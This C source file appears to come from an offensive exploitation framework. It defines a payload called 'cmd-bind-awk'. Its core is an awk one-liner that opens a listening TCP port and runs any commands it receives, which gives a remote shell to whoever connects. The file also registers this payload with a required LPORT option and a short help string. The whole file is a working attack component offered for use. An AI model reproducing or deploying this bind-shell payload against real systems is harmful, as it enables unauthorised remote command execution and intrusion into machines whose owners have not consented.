
#include "../payloads.h"
#include "../exploits.h"
#include <stdlib.h>

// payload's content
unsigned char cmdBindAwkPayload[] = 
"awk 'BEGIN{s=\"/inet/tcp/%s/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'";

void cmdBindAwkHelp()
{
    printf("listens for a connection & spawns shell via awk\n");
}

// payload's options
struct payloadParam cmdBindAwkOpts[MAX_NUM_OF_PARAMS] = {
    { "LPORT", REQUIRED, STRING, NOT_SET, NULL, NOT_SET }
};

struct payload cmdBindAwk = {
    2,
    "cmd-bind-awk",
    cmdBindAwkPayload,
    95,
    cmdBindAwkOpts,
    1,
    NULL,
    cmdBindAwkHelp
};

